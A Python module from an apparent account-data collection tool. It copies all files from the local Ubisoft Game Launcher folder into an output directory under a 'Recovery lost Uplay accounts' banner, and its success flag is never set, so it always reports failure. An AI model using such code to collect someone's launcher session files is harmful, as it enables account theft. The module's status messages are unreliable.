import os
import shutil

from config import ModuleManager, Constant


class UplayRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "UplayRecovery")
        
        self.banner(r"""
     _______         ______         _             _____                                 
    |.-----.|       (______)       (_)           (_____)                     ____  ____ 
    ||x . x||       (_)__    ____   _    ___    (_)  ___   ____   __   __   (____)(____)
    ||_.-._||       (____)  (____) (_) _(___)   (_) (___) (____) (__)_(__) (_)_(_)(_)__ 
    `--)-(--`       (_)____ (_)_(_)(_)(_)___    (_)___(_)( )_( )(_) (_) (_)(__)__  _(__)
   __[=== o]___     (______)(____) (_) (____)    (_____)  (__)_)(_) (_) (_) (____)(____)
  |:::::::::::|\            (_)                                                         
  `-=========-`()           (_)                                                                     
                                   Recovery lost Uplay accounts
                    """)

        self.save_folder = self.output_folder_user / 'applications' / 'uplay'
        self.uplay_path = Constant.local_dir / "Ubisoft Game Launcher"

        self.save_folder.mkdir(parents=True, exist_ok=True)

    def run(self) -> None:
        recovered = False
        if os.path.isdir(self.uplay_path):
            for item in os.listdir(self.uplay_path):
                if os.path.isfile(os.path.join(self.uplay_path, item)):
                    try:
                        shutil.copy(os.path.join(self.uplay_path, item), os.path.join(self.save_folder, item))
                    except Exception as e:
                        self.merror(f"Unable to copy {os.path.join(self.uplay_path, item)} to {os.path.join(self.save_folder, item)} -> {e}")
        else:
            self.mdebug(f"Unable to find Uplay installation at: {self.uplay_path}")

        if recovered:
            self.mprint(f"Recovered Uplay")
        else:
            self.merror(f"Unable to recover Uplay")
